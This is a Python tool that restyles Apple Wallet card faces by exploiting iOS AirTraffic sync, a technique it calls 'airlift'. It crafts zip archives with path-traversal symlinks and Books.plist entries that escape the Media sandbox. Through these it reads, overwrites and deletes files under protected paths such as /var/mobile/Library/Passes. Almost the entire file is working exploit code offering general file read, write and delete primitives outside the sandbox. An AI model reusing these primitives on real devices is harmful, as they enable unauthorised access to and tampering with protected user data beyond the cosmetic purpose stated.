#!/usr/bin/env python3
"""Apply custom card skins to Apple Wallet passes using airlift exploit."""

import hashlib
import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import struct
import subprocess
import sys
import tempfile
import time
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
DEVICE_HELPER = ROOT / "bin" / "device_helper" if (ROOT / "bin" / "device_helper").is_file() else ROOT / "build" / "device_helper"
AIRTRAFFIC_HOST = ROOT / "bin" / "airtraffic_host" if (ROOT / "bin" / "airtraffic_host").is_file() else ROOT / "build" / "airtraffic_host"
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SOURCE_PREFIX = "airlift-src-"
LINK_PREFIX = "airlift-link-"
RECOVERED_PREFIX = "airlift-recovered-"
SZ_EXTRA_ID = 0x5A53


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_archive_multi(target: str, files: list[tuple[str, bytes]]) -> bytes:
    target_tail = target.lstrip("/")
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            if not component:
                continue
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        for idx, (_leaf, payload) in enumerate(files):
            archive.writestr(zip_info(f"payload_{idx}", stat.S_IFREG | 0o600), payload)
        if files:
            archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), files[0][1])
    return output.getvalue()


def build_batch_read_archive(target: str) -> bytes:
    """Staging archive for a batch read: the link to `target` plus an empty
    `out/` directory inside the generated tree. AirTraffic moves the requested
    files into `out/`, and finish-write removes the whole tree afterwards, so
    nothing of ours is left in Media and no generated name needs a suffix."""
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/", "out/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600),
                         b"aircard-batch-read-staging")
    return output.getvalue()


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def run_json(command: list[str], timeout: int) -> dict:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    result = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            val = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(val, dict):
            result = val
            break
    if result is None:
        raise RuntimeError(f"{Path(command[0]).name} failed: {completed.stderr}")
    result["exitCode"] = completed.returncode
    return result


def run_json_streaming(command: list[str], timeout: int, on_progress=None) -> dict:
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
    )
    result = None
    try:
        if proc.stdout:
            for line in iter(proc.stdout.readline, ""):
                line_str = line.strip()
                if not line_str:
                    continue
                try:
                    val = json.loads(line_str)
                    if isinstance(val, dict):
                        if val.get("type") == "atc_progress" and on_progress:
                            on_progress(val)
                        result = val
                except json.JSONDecodeError:
                    pass
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        raise TimeoutError(f"{Path(command[0]).name} timed out after {timeout}s")

    if result is None:
        stderr = proc.stderr.read() if proc.stderr else ""
        raise RuntimeError(f"{Path(command[0]).name} failed: {stderr}")
    result["exitCode"] = proc.returncode
    return result


def native(command: str, udid: str, *arguments: str) -> dict:
    return run_json(
        [os.fspath(DEVICE_HELPER), command, udid, *arguments], timeout=60
    )


def operation_ok(result: dict) -> bool:
    return bool(
        result.get("exitCode") == 0
        and result.get("targetGatePassed")
        and result.get("operation", {}).get("ok")
    )


def read_file(udid: str, target: str, leaf: str, retries: int = 1) -> "bytes | None":
    """Exports a file outside Media into Media, reads it via AFC, restores it.

    Move semantics: the AirTraffic sync MOVES target/leaf to Media/recovered.
    The original is written back immediately with write_file, then the export
    staging is cleaned and Books preimage restored. Returns file bytes, or
    None on failure. Test only on disposable paths before Wallet data.
    """
    if "/" in leaf or leaf in ("", ".", ".."):
        raise ValueError("leaf must be a plain file name")
    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            target_path = posixpath.join(target, leaf)
            target_identifier = posixpath.relpath(target_path, AIRLOCK_ROOT)

            identifiers = [link_identifier, target_identifier]
            destinations = [link_destination, recovered]

            with tempfile.TemporaryDirectory(prefix="airlift-read-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                local_out = work / "recovered.bin"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive(target, b"aircard-backup-staging"))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return None

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    try:
                        native("finish-write", udid, source, link_destination,
                               recovered, os.fspath(snapshot_root))
                    except Exception:
                        pass
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return None

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))
                atc = run_json(atc_cmd, timeout=120)
                if not (atc.get("exitCode") == 0 and atc.get("ok")):
                    try:
                        native("finish-write", udid, source, link_destination,
                               recovered, os.fspath(snapshot_root))
                    except Exception:
                        pass
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return None

                rd = native("afc-read", udid, recovered, os.fspath(local_out))
                if not operation_ok(rd) or not local_out.is_file():
                    # Original is sitting in Media/recovered; do NOT delete it.
                    # Leave staging for manual recovery, report failure.
                    return None
                data = local_out.read_bytes()

                restored = write_file(udid, target, leaf, data, retries=3)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )
                if restored and operation_ok(finish):
                    return data
                # Bytes were still captured; return them so caller can save
                # a backup copy even if cleanup reported incomplete.
                if data:
                    return data
                return None
        except Exception:
            pass
        if attempt < retries:
            time.sleep(0.3 * attempt)
    return None


def read_files_batch(udid: str, target: str, leaves: list[str],
                     retries: int = 1) -> dict:
    """Read several files under one protected directory in a single move cycle.

    Every leaf is moved into Media inside the same AirTraffic session, read with
    one small AFC read each, then all of them are written back by a single
    write_files_batch cycle. N files therefore cost one staging cycle instead of
    N, which is what makes a multi-card download worth batching.

    Returns {leaf: bytes} for the leaves that could be read. A leaf whose file
    could not be read is absent from the result and its staging is deliberately
    left in place (never delete bytes we have not restored).
    """
    if not leaves:
        return {}
    for leaf in leaves:
        if (not leaf or leaf.startswith("/") or leaf.endswith("/")
                or any(part in ("", ".", "..") for part in leaf.split("/"))):
            raise ValueError("leaf must be a relative path inside target")

    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"

            # "recovered" only satisfies the helper's generated-name check; the
            # moved files land in <source>/out/, which finish-write removes.
            recovered = f"{RECOVERED_PREFIX}{token}"
            read_directory = f"{source}/out"
            link_identifier = f"../../{source}/p0/p1/p2/link"
            identifiers = [link_identifier]
            destinations = [link_destination]
            reads = []
            for index, leaf in enumerate(leaves):
                target_path = posixpath.join(target, leaf)
                identifiers.append(posixpath.relpath(target_path, AIRLOCK_ROOT))
                destination = f"{read_directory}/{index}.bin"
                destinations.append(destination)
                reads.append(destination)

            with tempfile.TemporaryDirectory(prefix="airlift-read-batch-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_batch_read_archive(target))
                books_path.write_bytes(build_books(identifiers))

                if not operation_ok(native("snapshot-books", udid, os.fspath(snapshot_root))):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return {}

                stage = native("stage", udid, source, link_destination, recovered,
                               os.fspath(archive_path), os.fspath(books_path),
                               os.fspath(snapshot_root))
                if not operation_ok(stage):
                    _abandon_batch_staging(udid, source, link_destination, recovered, snapshot_root)
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return {}

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))
                atc = run_json(atc_cmd, timeout=120)
                if not (atc.get("exitCode") == 0 and atc.get("ok")):
                    _abandon_batch_staging(udid, source, link_destination, recovered, snapshot_root)
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return {}

                data: dict = {}
                unread = []
                for index, leaf in enumerate(leaves):
                    local_out = work / f"recovered-{index}.bin"
                    read = native("afc-read", udid, reads[index], os.fspath(local_out))
                    if operation_ok(read) and local_out.is_file():
                        data[leaf] = local_out.read_bytes()
                    else:
                        unread.append(leaf)

                # Whatever came back is written to the phone again in one cycle.
                restored = True
                if data:
                    restored = write_files_batch(udid, target, sorted(data.items()), retries=3)

                if unread or not restored:
                    # The unread originals are still in <source>/out/, so leave the
                    # staging tree alone rather than deleting bytes we do not have.
                    return data

                native("finish-write", udid, source, link_destination, recovered,
                       os.fspath(snapshot_root))
                return data
        except Exception:
            pass
        if attempt < retries:
            time.sleep(0.3 * attempt)
    return {}


def _abandon_batch_staging(udid: str, source: str, link_destination: str,
                           recovered: str, snapshot_root: Path) -> None:
    """Best-effort cleanup after a batch read never moved anything."""
    try:
        native("finish-write", udid, source, link_destination, recovered,
               os.fspath(snapshot_root))
    except Exception:
        pass


STAT_LINK_CACHE = Path(tempfile.gettempdir()) / "aircard-stat-links.json"


def _stat_link_key(udid: str, parent: str) -> str:
    return hashlib.sha1(f"{udid}\0{parent}".encode()).hexdigest()


def _load_stat_links() -> dict:
    try:
        links = json.loads(STAT_LINK_CACHE.read_text("utf-8"))
    except Exception:
        return {}
    return links if isinstance(links, dict) else {}


def _save_stat_links(links: dict) -> None:
    try:
        STAT_LINK_CACHE.write_text(json.dumps(links), encoding="utf-8")
    except OSError:
        pass


def _stat_through_link(udid: str, link: str, names: "list[str]") -> "dict | None":
    requested = [f"{link}/{name}" for name in names]
    stat = native("afc-stat-many", udid, *requested)
    operation = stat.get("operation") or {}
    reported = operation.get("results")
    if not (operation_ok(stat) and isinstance(reported, dict)):
        return None
    # A response that does not cover every requested path means the link is not
    # usable; the caller then relocates it and asks again.
    if any(relative not in reported for relative in requested):
        return None
    results = {}
    for name, relative in zip(names, requested):
        entry = reported.get(relative) or {}
        results[name] = {
            "present": bool(entry.get("ok")),
            "kind": entry.get("kind"),
            "size": entry.get("size"),
            # Kept so callers can tell a sandbox denial from a missing file.
            "error": entry.get("error"),
            "afcStatus": entry.get("afcStatus"),
        }
    return results


def _discard_kept_link(udid: str, link: str) -> None:
    """Remove one of our kept links, refusing anything that is not one of ours."""
    token = link[len(LINK_PREFIX):] if link.startswith(LINK_PREFIX) else ""
    if not token or not all(c in "0123456789abcdef" for c in token) or len(token) != 20:
        return
    try:
        remove_files(udid, "/var/mobile/Media", [link], retries=1)
    except Exception:
        pass


def link_is_live(udid: str, link: str) -> bool:
    """True when the relocated link still resolves to a directory."""
    stat = native("afc-stat", udid, f"{link}/")
    operation = stat.get("operation") or {}
    return bool(operation_ok(stat) and operation.get("kind") == "S_IFDIR")


def file_service_available(udid: str) -> bool:
    """True when the iPhone exposes AFC, which in practice means it is unlocked."""
    try:
        return (native("probe", udid) or {}).get("afcStatus") == 0
    except Exception:
        return False


def release_stat_link(udid: str, parent: str) -> None:
    """Remove a kept link so nothing of ours stays in the phone's Media folder."""
    key = _stat_link_key(udid, parent)
    links = _load_stat_links()
    link = links.pop(key, None)
    _save_stat_links(links)
    if link:
        try:
            remove_files(udid, "/var/mobile/Media", [link], retries=1)
        except Exception:
            pass


def stat_paths(udid: str, parent: str, names: "list[str]", retries: int = 2) -> dict:
    """Attributes for files under one protected directory, without moving them.

    Stages a symlink to `parent` into Media, relocates that symlink with
    AirTraffic and stats "<link>/<name>" through it. Wallet files are never
    opened, moved or rewritten, so an interrupted session cannot lose data.
    The relocated link is kept between calls, which turns each later lookup
    into a single AFC round trip instead of a fresh relocation.
    """
    if not names:
        raise ValueError("names must not be empty")
    for name in names:
        # Relative sub-paths are allowed ("<card>.pkpass/cardBackground.png.urls"),
        # but nothing may escape the directory being inspected.
        if (not name or name.startswith("/") or name.endswith("/")
                or any(part in ("", ".", "..") for part in name.split("/"))):
            raise ValueError("name must be a relative path inside the directory")

    key = _stat_link_key(udid, parent)
    cached = _load_stat_links().get(key)
    if cached and link_is_live(udid, cached):
        reused = _stat_through_link(udid, cached, names)
        if reused is not None:
            return reused

    results: dict = {}
    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"
            # The payload lands inside the staging tree, which finish-write
            # already deletes, so no second relocation is needed to clean up.
            probe_media = f"{source}/probe.txt"
            link_identifier = f"../../{source}/p0/p1/p2/link"
            payload_identifier = f"../../{source}/payload"

            with tempfile.TemporaryDirectory(prefix="airlift-stat-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive(parent, b"aircard-stat"))
                books_path.write_bytes(
                    build_books([link_identifier, payload_identifier])
                )

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return results

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    try:
                        native("finish-write", udid, source, link_destination,
                               recovered, os.fspath(snapshot_root))
                    except Exception:
                        pass
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return results

                # The relocated symlink is the only thing that touches Media;
                # the payload lands in a throwaway Media file beside it.
                atc = run_json(
                    [os.fspath(AIRTRAFFIC_HOST), udid,
                     link_identifier, link_destination,
                     payload_identifier, probe_media],
                    timeout=120,
                )
                if not (atc.get("exitCode") == 0 and atc.get("ok")):
                    try:
                        native("finish-write", udid, source, link_destination,
                               recovered, os.fspath(snapshot_root))
                    except Exception:
                        pass
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return results

                reported = _stat_through_link(udid, link_destination, names)
                if reported is not None:
                    results = reported

                # Keep the relocated link so the next lookup is a single AFC
                # round trip; the Books preimage and staging are always restored.
                native("finish-keep-link", udid, source, link_destination,
                       recovered, os.fspath(snapshot_root))

            if results:
                if link_is_live(udid, link_destination):
                    links = _load_stat_links()
                    # The link this replaces is dead (that is why we staged a new
                    # one), so drop it instead of leaving it in Media for good.
                    if cached and cached != link_destination:
                        _discard_kept_link(udid, cached)
                    links[key] = link_destination
                    _save_stat_links(links)
                return results
        except Exception:
            pass
        if attempt < retries:
            # The helper's target gate (device productType) can come back empty
            # for a moment right after another session; give it room to settle.
            time.sleep(0.8 * attempt)
    return results


def write_file(udid: str, target: str, leaf: str, payload: bytes, retries: int = 3) -> bool:
    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            payload_identifier = f"../../{source}/payload"

            # Step 1: move link to media
            # Step 2: move new payload into link/leaf (atomically creates or overwrites target)
            identifiers = [link_identifier, payload_identifier]
            destinations = [
                link_destination,
                posixpath.join(link_destination, leaf),
            ]

            with tempfile.TemporaryDirectory(prefix="airlift-write-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive(target, payload))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))
                atc = run_json(atc_cmd, timeout=120)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )

            ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
            if ok:
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(0.3 * attempt)

    return False


def write_files_batch(
    udid: str,
    target: str,
    files: list[tuple[str, bytes]],
    retries: int = 3,
    progress_callback=None,
) -> bool:
    if not files:
        return True

    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            identifiers = [link_identifier]
            destinations = [link_destination]

            for idx, (leaf, _) in enumerate(files):
                identifiers.append(f"../../{source}/payload_{idx}")
                destinations.append(posixpath.join(link_destination, leaf))

            with tempfile.TemporaryDirectory(prefix="airlift-batch-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive_multi(target, files))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))

                timeout = max(120, len(files) * 2)
                if progress_callback:
                    atc = run_json_streaming(atc_cmd, timeout=timeout, on_progress=progress_callback)
                else:
                    atc = run_json(atc_cmd, timeout=timeout)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )

            ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
            if ok:
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(0.4 * attempt)

    return False


def remove_files(udid: str, target: str, leaves: list[str], retries: int = 3) -> bool:
    """Remove specific files through the relocated Airlift symlink.

    Wallet only rebuilds its rendered card faces when the old cache entries are
    absent. Overwriting them with arbitrary bytes leaves stale artwork active on
    recent iOS releases, so cache invalidation must be a real unlink operation.
    """
    if not leaves:
        return True
    if any(not leaf or "/" in leaf or leaf in {".", ".."} for leaf in leaves):
        raise ValueError("cache leaves must be plain file names")

    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"
            link_identifier = f"../../{source}/p0/p1/p2/link"
            protected_identifiers = [
                f"../../{link_destination}/{leaf}" for leaf in leaves
            ]
            removed_destinations = [
                f"{source}/removed-{index}" for index in range(len(leaves))
            ]

            with tempfile.TemporaryDirectory(prefix="airlift-remove-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                # Relocate the symlink first, then have AirTraffic move each
                # protected cache file out through it. This is a real unlink;
                # AFCRemovePath cannot traverse the protected link on iOS 27.
                archive_path.write_bytes(build_archive(target, b"aircard-v2"))
                books_path.write_bytes(build_books(
                    [link_identifier, *protected_identifiers]
                ))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    raise RuntimeError("could not snapshot Books state")
                stage = native(
                    "stage", udid, source, link_destination, recovered,
                    os.fspath(archive_path), os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    raise RuntimeError("could not stage cache removal")

                atc = run_json(
                    [os.fspath(AIRTRAFFIC_HOST), udid,
                     link_identifier, link_destination,
                     *[part for pair in zip(protected_identifiers, removed_destinations)
                       for part in pair]],
                    timeout=120,
                )
                if atc.get("exitCode") != 0 or not atc.get("ok"):
                    native("finish-write", udid, source, link_destination,
                           recovered, os.fspath(snapshot_root))
                    raise RuntimeError("could not relocate cache link")

                finish = native(
                    "finish-moved-removal", udid, source, link_destination,
                    recovered, os.fspath(snapshot_root), str(len(leaves)),
                )
                if operation_ok(finish):
                    return True
        except Exception:
            pass
        if attempt < retries:
            time.sleep(0.4 * attempt)
    return False


def invalidate_cache(udid: str, card_hash: str) -> bool:
    """Remove every rendered card face so Wallet must rebuild from the pass."""
    all_ok = True
    cache_leaves = ["FrontFace", "PlaceHolder", "Preview"]
    for ext in [".cache", ".pkcache"]:
        cache_dir = f"/var/mobile/Library/Passes/Cards/{card_hash}{ext}"
        try:
            all_ok = remove_files(udid, cache_dir, cache_leaves) and all_ok
        except Exception:
            all_ok = False
    return all_ok


def main():
    if len(sys.argv) < 3:
        print("Usage: apply_card_skin.py <udid> <image_path> [card_hash ...]")
        return
    udid = sys.argv[1]
    img_path = Path(sys.argv[2])
    if not img_path.is_file():
        print(f"Error: {img_path} not found")
        sys.exit(1)
    img_data = img_path.read_bytes()
    hashes = sys.argv[3:]

    print(f"Loaded image from batter: {len(img_data)} bytes")
    print(f"Targeting {len(hashes)} cards on device {udid}...")

    for index, h in enumerate(hashes, 1):
        target_dir = f"/var/mobile/Library/Passes/Cards/{h}.pkpass"
        print(f"\n[{index}/{len(hashes)}] Processing card: {h}")

        print("  -> Writing card artwork (fast batch)...")
        card_assets = [
            ("cardBackgroundCombined@3x.png", img_data),
            ("cardBackgroundCombined@2x.png", img_data),
        ]
        ok_batch = write_files_batch(udid, target_dir, card_assets)
        if not ok_batch:
            ok3x = write_file(udid, target_dir, "cardBackgroundCombined@3x.png", img_data)
            ok2x = write_file(udid, target_dir, "cardBackgroundCombined@2x.png", img_data)
            ok_batch = ok3x and ok2x
        print(f"     Result: {'SUCCESS' if ok_batch else 'FAILED'}")

        print("  -> Invalidating pass cache...")
        ok_cache = invalidate_cache(udid, h)
        print(f"     Result: {'SUCCESS' if ok_cache else 'FAILED (or cache already empty)'}")

    print("\nAll done! Please force close Wallet on your iPhone and reopen it.")


if __name__ == "__main__":
    main()
